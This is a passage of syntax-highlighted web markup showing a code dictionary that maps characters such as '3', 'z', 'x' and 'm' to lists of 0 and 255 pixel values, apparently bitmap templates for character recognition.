class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'3'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'z'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'x'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'c'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'v'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'b'</span>:[<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'n'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'m'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span 